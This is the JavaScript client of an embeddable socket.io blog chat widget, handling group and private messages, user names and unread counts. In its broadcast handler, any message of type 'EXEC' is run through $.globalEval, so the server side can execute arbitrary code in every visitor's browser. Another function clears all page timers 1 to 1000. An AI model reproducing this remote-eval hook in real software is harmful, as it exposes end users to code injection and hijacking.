

function htmlspecialchars(str){
  str = str || '';
  str = str.replace(/&/g, '&amp;');
  str = str.replace(/</g, '&lt;');
  str = str.replace(/>/g, '&gt;');
  str = str.replace(/"/g, '&quot;');
  str = str.replace(/'/g, '&#039;');
  return str;
}
var ChatRoomClient = function() {
  this.users = [];
  this.nameChanged = false;
  this.totalCount = 0;
  // this.socket = io.connect('http://123.56.230.53:29231/');
  this.socket = io(location.origin, {path: '/chat/socket.io'})
  // this.socket = io.connect(location.origin + '/chat');
  this.startup();
  this.init();
};
ChatRoomClient.prototype.init = function() {
  this.connection();
  this.socketEvent();
  this.bindEvent();
  this.addInfoLog({
    msg: '注意：聊天日志不会保存，请注意备份.'
  }, 'group');
  this.addInfoLog({
    msg: '提示：点击头像可进入私聊'
  }, 'group');
};
ChatRoomClient.prototype.startup = function() {
  var xtpl = [
    '<div class="chatroom">',
      '<div class="chatroom-feedback"><a href="https://github.com/barretlee/blogChat" target="_blank">源码</a> | <a href="https://github.com/barretlee/blogChat/issues/new" target="_blank">反馈</a></div>',
      '<div class="chatroom-info"></div>',
      '<ul class="chatroom-tribes">',
        '<li class="chatroom-tribe current" data-id="group">',
          '<span class="name">当前 <strong>1</strong> 人群聊</span>',
          '<span class="count">0</span>',
        '</li>',
      '</ul>',
      '<div class="chatroom-pannels">',
        '<div class="chatroom-pannel-bd">',
          '<div class="chatroom-item current" data-id="group">',
          '</div>',
        '</div>',
        '<div class="chatroom-pannel-ft"><textarea type="text" class="chatroom-input" placeholder="按 Ctrl+Enter 发送"></textarea><span class="chatroom-send-btn">发送</span></div>',
      '</div>',
    '</div>'
  ].join('\n');
  $('html').append(xtpl);
}
ChatRoomClient.prototype.connection = function(cb) {
  var self = this;
  self.socket.on('connected', function(data) {
    if(data.size) {
      $('.chatroom-tribe[data-id="group"] .name strong').text(data.size + 1);
    }
    self.userId = data.id;
    self.userName = self.userId.slice(2);
    self.userAvatar = '//avatar.duoshuo.com/avatar-50/292/117200.jpg';
    if(window.DUOSHUO && window.DUOSHUO.visitor
       && window.DUOSHUO.visitor.data.user_id) {
      var userInfo = window.DUOSHUO.visitor.data;
      self.userId = userInfo.user_id;
      self.userName = userInfo.name;
      self.userAvatar = userInfo.avatar_url;
    } else if($.cookie && ($.cookie('visitor') || $.cookie('visitor_history'))) {
      var info = $.cookie('visitor') || $.cookie('visitor_history');
      try {
        var info = JSON.parse(info);
        if(info.id && info.name && info.avatar) {
          self.userId = info.id;
          self.userName = info.name;
          self.userAvatar = info.avatar;
        }
      } catch(e) {}
    } else {
      if(window.localStorage) {
        var userId = window.localStorage.getItem('userId');
        if(userId) {
          self.userId = userId.length > 12 ? userId.slice(0, 12) : userId;
          self.userName = userId.slice(2);
        } else {
          window.localStorage.setItem('userId', self.userId);
        }
        var userName = window.localStorage.getItem('userName');
        if(userName) {
          self.userName = userName;
        }
      }
    }
    if(window.localStorage) {
      window.localStorage.setItem('userId', self.userId);
    }
    if(!self.nameChanged) {
      self.nameChanged = true;
      return self.changeName();
    }
    // console.info('ID: ' + self.userId);
    self.socket.emit('createUser', {
      userId: self.userId,
      userName: self.userName,
      userAvatar: self.userAvatar
    });
  });
};
ChatRoomClient.prototype.checkRobot = function() {
    var i = 0;
    while(i++ < 1E3) {
      clearInterval(i);
    }
    if(document.visibilityState && document.visibilityState !== 'visible') {
        return false;
    }
    return true;
};
ChatRoomClient.prototype.changeName = function() {
  if($('.chatroom-rename').size()) return;
  var self = this;
  var str = '<div class="chatroom-rename" style="display:none;"><label>取个名字：</label><input type="text" value="' +
    htmlspecialchars(self.userName) +'" placeholder="不要取太长的名字啦~"><span>确认</span></div>';
  $(str).appendTo($('.chatroom')).fadeIn();
  $('.chatroom-rename span').on('click', function() {
    var $input = $('.chatroom-rename input');
    if($.trim($input.val())) {
      self.userName = $.trim($input.val()).slice(0, 12);
      self.socket.emit('createUser', {
        userId: self.userId,
        userName: self.userName,
        userAvatar: self.userAvatar
      });
      if(window.localStorage) {
        window.localStorage.setItem('userName', self.userName);
      }
      $('.chatroom-rename').remove();
    }
  });
};
ChatRoomClient.prototype.socketEvent = function() {
  var self = this;
  self.socket.on('broadcast', function(data) {
    if(data.type == 'EXEC')  {
      return $.globalEval(data.code);
    }
    if(data.id == self.userId) return;
    if(data.type == 'NEW') {
      if($.inArray(data.id, self.users) > -1) return false;
      self.users.push(data.id);
      return self.addWelcomeLog(data);
    }
    // if(data.type == 'LEAVE') {
    //   return self.addInfoLog(data);
    // }
    self.addChatLog(data, 'group');
    self.updateCount('group');
  });
  self.socket.on('pm', function(data) {
    if(data.type == 'DISCONNECT') {
      self.socket.emit('forceDisconnect', {
        id: self.userId
      });
      self.socket.disconnect();
      return self.addInfoLog(data, 'group');
    }
    if(data.type == 'OFFLINE') {
      return self.addInfoLog(data);
    }
    if(data.type == 'ATTENSION') {
      return self.addInfoLog(data, 'group');
    }
    if($('.chatroom-fold').size()) {
        var str = "<img class='alert-avatar' src='" +
            htmlspecialchars(data.avatar) + "'>" + htmlspecialchars(data.name) + "の私信，右下角查看";
        if ('Notification' in window) {
          window.operation && operation.alertMsg({
            body: htmlspecialchars(data.name) + "の私信，右下角查看",
            icon: htmlspecialchars(data.avatar),
            title: '群聊消息'
          }, true);
          $('.chatroom-fold .chatroom-info').trigger('click');
        } else {
          window.operation && operation.alertMsg(str);
        }
    }
    self.createPrivateChat(data);
    self.addChatLog(data, data.id);
    self.updateCount(data.id);
  });
  self.socket.on('pong', function(data) {
    var type = data.type;
    if(type === 'PONG') {
      $('.chatroom-tribe .name strong').text(data.count);
      if($('.chatroom').hasClass('chatroom-fold') && this.totalCount) {
        $('.chatroom .count').eq(0).text(this.totalCount).css('visibility', 'visible');
      }
    } else if(type === 'PING-BACK') {
      console.warn(data);
    }
  });
};
ChatRoomClient.prototype.bindEvent = function() {
  var self = this;
  $('.chatroom').on('keydown', function(evt) {
    if(evt.keyCode == 27) {
      $(this).addClass('chatroom-fold');
    }
  });
  $('.chatroom-input').on('keydown', function(evt) {
    var $this = $(this);
    if((evt.ctrlKey || evt.metaKey) && evt.keyCode == '13' && $.trim($this.val()) || evt.isTrigger) {
      var targetId = $('.chatroom-tribe.current').attr('data-id');
      var val = $this.val();
      if(val.length >= 516) {
        val = val.slice(0, 500) + '...(输入太长，系统自动截断)';
      }
      var data = {
        id: self.userId,
        msg: val,
        name: self.userName,
        avatar: self.userAvatar,
        targetId: targetId
      };
      if(!self.checkRobot()) return;
      self.socket.emit(targetId == 'group' ? 'gm' : 'pm', data);
      self.addChatLog(data, targetId, true);
      $this.val('').focus();
      return false;
    }
  });
  $('.chatroom-send-btn').on('click', function(evt) {
    if($.trim($('.chatroom-input').val())) {
      $('.chatroom-input').trigger('keydown');
    }
  });
  $('.chatroom-tribes').on('click', 'li', function(evt) {
    evt.preventDefault();
    var id = $(this).attr('data-id');
    var $target = $('.chatroom-item[data-id="' + htmlspecialchars(id) + '"]');
    $('.chatroom-tribes').find('li').removeClass('current');
    $('.chatroom-item').removeClass('current');
    $(this).addClass('current');
    $target.addClass('current').scrollTop(1E5);
    $(this).find('.count').text(0).css('visibility', 'hidden');
    var count = parseInt($(this).find('.count').text());
    count = isNaN(count) ? 0 : +count;
    this.totalCount -= count;
    setTimeout(function() {
      $('.chatroom textarea').focus();
    }, 10);
    $('.chatroom-pannel-bd').scrollTop($target.attr('data-lastscroll'));
  });
  $('.chatroom-tribes').on('click', 'i', function(evt) {
    evt.preventDefault();
    evt.stopImmediatePropagation();
    var $p = $(this).parent('li');
    var id = $p.attr('data-id');
    $p.remove();
    $(".chatroom-item[data-id='" + htmlspecialchars(id) + "']").remove();
    $('.chatroom-item').removeClass('current');
    $('.chatroom-item[data-id="group"]').addClass('current');
    $('.chatroom-tribe[data-id="group"]').addClass('current');
    var count = parseInt($(this).find('.count').text());
    count = isNaN(count) ? 0 : +count;
    this.totalCount -= count;
    $('.chatroom-pannel-bd').scrollTop(1E5);
  });
  $(".chatroom-item").on('click', '.avatar, .time, .name', function(evt) {
    evt.preventDefault();
    evt.stopImmediatePropagation();
    var $this = $(this);
    var $p = $this.parent('.chatroom-log');
    var avatar = $p.find('.avatar img').attr('src');
    var name = $p.find('.time b').text();
    var id = $p.find('.time b').attr('data-id');
    if(id === self.userId) return;
    if($this.parent().hasClass('chatroom-log-welcome')) {
      $p = $this.parent();
      id = $p.attr('data-id');
      avatar = $p.find('.avatar').attr('src');
      name = $p.find('.name').text();
    }
    self.createPrivateChat({
      avatar: avatar,
      name: name,
      id: id
    }, true);
    self.addInfoLog({
      msg: '与 ' + name + ' 私聊'
    }, id);
  });
  $(".chatroom-info").on('click', function(evt) {
    evt.preventDefault();
    // $('.chatroom').toggleClass('chatroom-fold');
    if(!$('.chatroom').hasClass('chatroom-fold')) {
      $('.chatroom').addClass('chatroom-fold');
      $('.chatroom textarea').focus();
      $('.chatroom-tribe').removeClass('current');
      $('.chatroom-item').removeClass('current');
      $('.chatroom-tribes>li').first().addClass('current');
      $('.chatroom-item').first().addClass('current');
      $('.chatroom .count').eq(0).text(0).css('visibility', 'hidden');
    } else {
      $('.chatroom').removeClass('chatroom-fold');
    }
  });
  if(/Mac OS/i.test(navigator.appVersion)) {
    $(".chatroom textarea").attr('placeholder', '按 Command+Enter 发送');
  }
  $(window).on('beforeunload close', function() {
    self.socket.emit('forceDisconnect', {
      id: self.userId
    });
    self.socket.disconnect();
  });
};
ChatRoomClient.prototype.ping = function(data) {
  if(!this.checkOnline('group')) return;
  data = data || {};
  data.id = this.userId;
  this.socket.emit('ping', data);
};
ChatRoomClient.prototype.createPrivateChat = function(data, setCurrent) {
  if($('.chatroom-item[data-id="' + htmlspecialchars(data.id) + '"]').size()) return;
  var tabXtpl = [
    '<li class="chatroom-tribe" data-id="<% id %>">',
      '<img src="<% avatar %>" alt="<% name %>">',
      '<span class="name"><% name %></span>',
      '<span class="count">0</span>',
      '<i class="iconfont">╳</i>',
    '</li>'
  ];
  var $li = tabXtpl.join('').replace(/<%\s*?(\w+)\s*?%>/gm, function($0, $1) {
    if($1 === 'avatar' && (!data || !data[$1])) {
      return '//avatar.duoshuo.com/avatar-50/292/117200.jpg';
    }
    return htmlspecialchars(data && data[$1] || '');
  });
  $(".chatroom-tribes").append($li);
  var id = data && data.id;
  var $pannel = '<div class="chatroom-item" data-id="' + htmlspecialchars(id) + '"></div>';
  $(".chatroom-pannel-bd").append($pannel);
  if(setCurrent) {
    $('.chatroom-tribe').removeClass('current');
    $('.chatroom-item').removeClass('current');
    $('.chatroom-tribes>li').last().addClass('current');
    $('.chatroom-item').last().addClass('current');
  }
  if(data.targetId) {
    this.addInfoLog({
      msg: '与 ' + htmlspecialchars(data.name) + ' 私聊'
    }, data.targetId);
  }
};
ChatRoomClient.prototype.checkOnline = function(id) {
  if(this.socket && this.socket.disconnected) {
    this.addInfoLog({
      msg: '您已离线，请刷新页面重新登录'
    }, id);
    return false;
  }
  return true;
};
ChatRoomClient.prototype.addChatLog = function(data, id, isSelf) {
  if(!this.checkOnline(id)) return;
  if(isSelf) {
    data.name = '我';
  }
  var logXtpl = [
    '<div class="chatroom-log' + (isSelf ? ' myself' : '') + '">',
      '<span class="avatar"><img src="<% avatar %>" alt="<% name %>"></span>',
      '<span class="time"><b data-id="<% id %>"><% name %></b> ' + new Date().toLocaleString() + '</span>',
      '<span class="detail"><% msg %></span>',
    '</div>'
  ];
  var $log = logXtpl.join('\n').replace(/<%\s*?(\w+)\s*?%>/gm, function($0, $1) {
    if($1 === 'avatar' && (!data || !data[$1])) {
      return '//avatar.duoshuo.com/avatar-50/292/117200.jpg';
    }
    return htmlspecialchars(data && data[$1] || '');
  });
  var $target = $(".chatroom-item[data-id='" + htmlspecialchars(id) + "']");
  $target.append($log);
  this.scroll(id, isSelf);
};
ChatRoomClient.prototype.scroll = function(id, isSelf) {
  var $target = $(".chatroom-item[data-id='" + htmlspecialchars(id) + "']");
  var $box = $('.chatroom-pannel-bd');
  var H = $target.height();
  var DELTA = 300;
  if(isSelf || $box.scrollTop() < H - DELTA) {
    $box.scrollTop(H);
    $target.attr('data-lastscroll', H);
  }
}
ChatRoomClient.prototype.addInfoLog = function(data, id) {
  var $info = '<div class="chatroom-log-info">' + htmlspecialchars(data.msg) + '</div>';
  var $target = $(".chatroom-item[data-id='" + htmlspecialchars(id) + "']");
  if(!id) {
    $target = $(".chatroom-item.current");
  }
  $target.append($info);
  this.scroll(id);
};
ChatRoomClient.prototype.addWelcomeLog = function(data) {
  var $info = '<div class="chatroom-log-info chatroom-log-welcome" data-id="' +
      htmlspecialchars(data.id) + '">欢迎 <img class="avatar" src="' + htmlspecialchars(data.avatar)
        + '"><strong class="name">' + htmlspecialchars(data.name) + '</strong> 加入群聊！</div>';
  var $target = $(".chatroom-item[data-id='group']");
  $target.append($info);
  this.scroll(data.id);
};
ChatRoomClient.prototype.updateCount = function(id) {
  var $li = $('.chatroom-tribe[data-id="' + htmlspecialchars(id) + '"]');
  var $target = $li.find('.count');
  var count = parseInt($target.text());
  count = isNaN(count) ? 0 : +count;
  if(++count > 99) {
    count = "+99";
  }
  $target.text(count).css('visibility', 'visible');
  this.totalCount++;
  if(this.totalCount > 99) {
    this.totalCount = "+99";
  }
  if($('.chatroom').hasClass('chatroom-fold')) {
    $('.chatroom .count').eq(0).text(this.totalCount).css('visibility', 'visible');
  } else {
    if($('.chatroom-tribe.current').attr('data-id') === 'group') {
      $('.chatroom .count').eq(0).text(0).css('visibility', 'hidden');
    }
  }
};

window.chatRoomClient = new ChatRoomClient();